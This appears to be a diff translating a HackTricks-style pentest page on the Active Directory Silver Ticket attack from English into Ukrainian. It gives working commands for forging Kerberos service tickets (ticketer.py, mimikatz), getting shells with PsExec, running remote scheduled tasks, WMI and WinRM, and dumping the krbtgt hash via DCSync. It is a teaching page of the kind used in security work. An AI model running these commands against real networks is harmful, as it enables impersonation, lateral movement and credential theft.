@@ -4,26 +4,23 @@
 
 <figure><img src="../../images/i3.png" alt=""><figcaption></figcaption></figure>
 
-**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!
+**Bug bounty tip**: **зареєструйтесь** на **Intigriti**, преміум **платформі для винагород за вразливості, створеній хакерами для хакерів**! Приєднуйтесь до нас на [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) сьогодні та почніть заробляти винагороди до **$100,000**!
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
 ## Silver ticket
 
-The **Silver Ticket** attack involves the exploitation of service tickets in Active Directory (AD) environments. This method relies on **acquiring the NTLM hash of a service account**, such as a computer account, to forge a Ticket Granting Service (TGS) ticket. With this forged ticket, an attacker can access specific services on the network, **impersonating any user**, typically aiming for administrative privileges. It's emphasized that using AES keys for forging tickets is more secure and less detectable.
+Атака **Silver Ticket** передбачає експлуатацію сервісних квитків в середовищах Active Directory (AD). Цей метод базується на **отриманні NTLM хешу облікового запису сервісу**, такого як обліковий запис комп'ютера, для підробки квитка служби надання квитків (TGS). З цим підробленим квитком зловмисник може отримати доступ до конкретних сервісів в мережі, **вдаючи з себе будь-якого користувача**, зазвичай намагаючись отримати адміністративні привілеї. Підкреслюється, що використання AES ключів для підробки квитків є більш безпечним і менш помітним.
 
-For ticket crafting, different tools are employed based on the operating system:
+Для створення квитків використовуються різні інструменти в залежності від операційної системи:
 
 ### On Linux
-
 ```bash
 python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
 export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
 python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
 ```
-
-### On Windows
-
+### На Windows
 ```bash
 # Create the ticket
 mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"
@@ -35,56 +32,52 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 # Obtain a shell
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
+CIFS-сервіс виділяється як загальна ціль для доступу до файлової системи жертви, але інші сервіси, такі як HOST і RPCSS, також можуть бути використані для завдань і WMI-запитів.
 
-The CIFS service is highlighted as a common target for accessing the victim's file system, but other services like HOST and RPCSS can also be exploited for tasks and WMI queries.
+## Доступні сервіси
 
-## Available Services
-
-| Service Type                               | Service Silver Tickets                                                     |
+| Тип сервісу                                | Сервісні срібні квитки                                                    |
 | ------------------------------------------ | -------------------------------------------------------------------------- |
 | WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
-| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Depending on OS also:</p><p>WSMAN</p><p>RPCSS</p> |
-| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In some occasions you can just ask for: WINRM</p> |
-| Scheduled Tasks                            | HOST                                                                       |
-| Windows File Share, also psexec            | CIFS                                                                       |
-| LDAP operations, included DCSync           | LDAP                                                                       |
-| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
-| Golden Tickets                             | krbtgt                                                                     |
+| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>В залежності від ОС також:</p><p>WSMAN</p><p>RPCSS</p> |
+| WinRM                                      | <p>HOST</p><p>HTTP</p><p>В деяких випадках ви можете просто запитати: WINRM</p> |
+| Заплановані завдання                       | HOST                                                                       |
+| Спільний доступ до файлів Windows, також psexec | CIFS                                                                       |
+| Операції LDAP, включаючи DCSync           | LDAP                                                                       |
+| Інструменти адміністрування віддалених серверів Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
+| Золоті квитки                             | krbtgt                                                                     |
 
-Using **Rubeus** you may **ask for all** these tickets using the parameter:
+Використовуючи **Rubeus**, ви можете **запитати всі** ці квитки, використовуючи параметр:
 
 - `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`
 
-### Silver tickets Event IDs
+### Ідентифікатори подій срібних квитків
 
-- 4624: Account Logon
-- 4634: Account Logoff
-- 4672: Admin Logon
+- 4624: Увійшов до облікового запису
+- 4634: Вийшов з облікового запису
+- 4672: Увійшов як адміністратор
 
-## Abusing Service tickets
+## Зловживання сервісними квитками
 
-In the following examples lets imagine that the ticket is retrieved impersonating the administrator account.
+У наступних прикладах уявімо, що квиток отримано, підробляючи обліковий запис адміністратора.
 
 ### CIFS
 
-With this ticket you will be able to access the `C$` and `ADMIN$` folder via **SMB** (if they are exposed) and copy files to a part of the remote filesystem just doing something like:
-
+З цим квитком ви зможете отримати доступ до папок `C$` і `ADMIN$` через **SMB** (якщо вони відкриті) і копіювати файли в частину віддаленої файлової системи, просто зробивши щось на зразок:
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
-
-You will also be able to obtain a shell inside the host or execute arbitrary commands using **psexec**:
+Ви також зможете отримати оболонку всередині хоста або виконати довільні команди, використовуючи **psexec**:
 
 {{#ref}}
 ../lateral-movement/psexec-and-winexec.md
 {{#endref}}
 
-### HOST
+### ХОСТ
 
-With this permission you can generate scheduled tasks in remote computers and execute arbitrary commands:
-
+З цією дозволом ви можете створювати заплановані завдання на віддалених комп'ютерах і виконувати довільні команди:
 ```bash
 #Check you have permissions to use schtasks over a remote server
 schtasks /S some.vuln.pc
@@ -96,11 +89,9 @@ schtasks /query /S some.vuln.pc
 #Run created schtask now
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
 ```
-
 ### HOST + RPCSS
 
-With these tickets you can **execute WMI in the victim system**:
-
+З цими квитками ви можете **виконати WMI в системі жертви**:
 ```bash
 #Check you have enough privileges
 Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
@@ -110,8 +101,7 @@ Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlis
 #You can also use wmic
 wmic remote.computer.local list full /format:list
 ```
-
-Find **more information about wmiexec** in the following page:
+Знайдіть **додаткову інформацію про wmiexec** на наступній сторінці:
 
 {{#ref}}
 ../lateral-movement/wmiexec.md
@@ -119,32 +109,28 @@ Find **more information about wmiexec** in the following page:
 
 ### HOST + WSMAN (WINRM)
 
-With winrm access over a computer you can **access it** and even get a PowerShell:
-
+З доступом winrm до комп'ютера ви можете **отримати доступ** до нього і навіть отримати PowerShell:
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
-
-Check the following page to learn **more ways to connect with a remote host using winrm**:
+Перевірте наступну сторінку, щоб дізнатися **більше способів підключення до віддаленого хоста за допомогою winrm**:
 
 {{#ref}}
 ../lateral-movement/winrm.md
 {{#endref}}
 
 > [!WARNING]
-> Note that **winrm must be active and listening** on the remote computer to access it.
+> Зверніть увагу, що **winrm має бути активним і слухати** на віддаленому комп'ютері для доступу до нього.
 
 ### LDAP
 
-With this privilege you can dump the DC database using **DCSync**:
-
+З цією привілеєю ви можете скинути базу даних DC, використовуючи **DCSync**:
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
+**Дізнайтеся більше про DCSync** на наступній сторінці:
 
-**Learn more about DCSync** in the following page:
-
-## References
+## Посилання
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
 - [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
@@ -155,9 +141,8 @@ dcsync.md
 
 <figure><img src="../../images/i3.png" alt=""><figcaption></figcaption></figure>
 
-**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!
+**Порада з баг-баунті**: **зареєструйтеся** на **Intigriti**, преміум **платформі для баг-баунті, створеній хакерами для хакерів**! Приєднуйтесь до нас на [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) сьогодні та почніть заробляти винагороди до **$100,000**!
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
 {{#include ../../banners/hacktricks-training.md}}
-
